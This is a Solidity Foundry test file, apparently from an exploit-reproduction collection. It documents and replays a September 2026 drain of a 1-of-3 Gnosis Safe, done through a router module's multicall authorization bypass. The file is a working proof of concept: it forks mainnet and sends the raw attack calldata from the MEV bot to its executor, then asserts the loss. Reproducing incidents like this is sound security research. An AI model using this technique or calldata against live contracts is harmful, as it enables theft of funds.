// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// rsETH Safe Module Exploit — Ethereum, 2026-09-15
//
// A Gnosis Safe (1-of-3) holding ~2,900 aEthrsETH (~$7.73M) was drained through a custom router
// module (0x4f0055...ebC) that had an authorization bypass in its multicall function. When the
// router's multicall was called with target = address(this), inner calls executed with msg.sender =
// the router itself, which was an authorized Safe module — bypassing owner signatures entirely.
//
// The original attacker (0x2f7e14...) submitted the exploit TX to the public mempool. MEV bot
// "Yoink" (0xfde0d1...) copied the calldata and front-ran it in block 25980525 (04:38:47 UTC).
// The attacker arrived an hour later and scraped ~174 aEthrsETH in leftovers.
//
// This PoC replays the Yoink TX calldata against a mainnet fork at block 25980524 (one block
// before the exploit). The raw calldata is sent from the Yoink bot address to the Yoink executor
// contract, reproducing the exact internal call path that drained the Safe.
//
// Root cause credit: SlowMist (@SlowMist_Team) identified the multicall _isAuthorized bypass from
// bytecode analysis.
//
// Victim Safe         : 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8 (1-of-3, Safe 1.3.0)
// Vulnerable Router   : 0x4f0055926c839D1d960a82CBF84E2eE933958ebC (module, removed post-exploit)
// Attacker            : 0x2f7e143e27f2fa26ef3b8ac72698f1d321422f67 (mempool TX displaced)
// Yoink MEV bot       : 0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Yoink executor      : 0x80bf7db69556d9521c03461978b8fc731dbbd4e4
// Yoink recipient     : 0xC70f00CD7E461686b04B0E912E309becA8b80ea0 (Kelp froze this address)
// aEthrsETH           : 0x2d62109243b87c4ba3ee7ba1d91b0dd0a074d7b1
// rsETH               : 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7
// Exploit block       : 25980525 (Sep 15, 2026 04:38:47 UTC)
// Exploit TX          : 0x0e7680b06cb8a6f86c149d9ba90d98e3d334e7b072dde03909d43fcfd98a8705

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface ISafe {
    function getOwners() external view returns (address[] memory);
    function getThreshold() external view returns (uint256);
    function isModuleEnabled(address module) external view returns (bool);
}

contract rsETHSafeExploit is Test {
    address constant SAFE = 0x40E93a52F6Af9fCD3b476aeDADD7FeABD9f7AbA8;
    address constant ROUTER = 0x4f0055926c839D1d960a82CBF84E2eE933958ebC;
    address constant YOINK_BOT = 0xfde0d1575ed8e06fbf36256bcdfa1f359281455a;
    address constant YOINK_EXECUTOR = 0x80bf7db69556d9521c03461978b8fc731dbbd4e4;
    address constant YOINK_RECIPIENT = 0xC70f00CD7E461686b04B0E912E309becA8b80ea0;

    IERC20 constant aEthrsETH = IERC20(0x2d62109243b87c4ba3ee7ba1d91b0dd0a074d7b1);
    IERC20 constant rsETH = IERC20(0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7);

    function setUp() public {
        vm.createSelectFork("mainnet", 25980524);
    }

    function testExploit() public {
        // --- PRE-STATE ---
        uint256 safeBalPre = aEthrsETH.balanceOf(SAFE);
        uint256 yoinkBalPre = rsETH.balanceOf(YOINK_RECIPIENT);

        emit log_named_decimal_uint("Safe aEthrsETH (pre)", safeBalPre, 18);
        emit log_named_decimal_uint("Yoink rsETH (pre)", yoinkBalPre, 18);

        // Verify pre-conditions
        ISafe safe = ISafe(SAFE);
        assertEq(safe.getThreshold(), 1, "threshold must be 1-of-3");
        assertTrue(safe.isModuleEnabled(ROUTER), "router must be enabled module pre-exploit");
        assertGt(safeBalPre, 2899e18, "Safe must hold >= 2900 aEthrsETH");

        // --- EXPLOIT: raw calldata replay ---
        // This is the exact calldata from the Yoink TX (0x0e7680b0...).
        // Yoink bot (0xfde0d1) called Yoink executor (0x80bf7d) which internally routed
        // through the vulnerable Safe module router (0x4f0055).
        bytes memory exploitCalldata = hex"9846cd9e0000000000000000000000000000000100000000006410605ee48ff962952c966277a5d2dac0a0705cb1882d6bfa00000000000000000000000000000000000000000000009d3595ab2438d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00a1290d69c65a6fe4df752f95823fae25cb99e5a70001f400000a0000000000000000f4b38c404cc88c590000000000000000000000000000000008a1290d69c65a6fe4df752f95823fae25cb99e5a700000000000000000000000000000000";

        vm.prank(YOINK_BOT);
        (bool success,) = YOINK_EXECUTOR.call(exploitCalldata);
        assertTrue(success, "exploit TX must succeed");

        // --- POST-STATE ---
        uint256 safeBalPost = aEthrsETH.balanceOf(SAFE);
        uint256 yoinkBalPost = rsETH.balanceOf(YOINK_RECIPIENT);

        emit log_named_decimal_uint("Safe aEthrsETH (post)", safeBalPost, 18);
        emit log_named_decimal_uint("Yoink rsETH (post)", yoinkBalPost, 18);

        // --- ASSERTIONS ---
        uint256 safeLoss = safeBalPre - safeBalPost;
        uint256 yoinkGain = yoinkBalPost - yoinkBalPre;

        emit log_named_decimal_uint("Safe loss", safeLoss, 18);
        emit log_named_decimal_uint("Yoink gain", yoinkGain, 18);

        assertGe(safeLoss, 2899e18, "Safe must lose >= 2900 aEthrsETH");
        assertGe(yoinkGain, 2882e18, "Yoink must gain >= 2882 rsETH");
    }
}
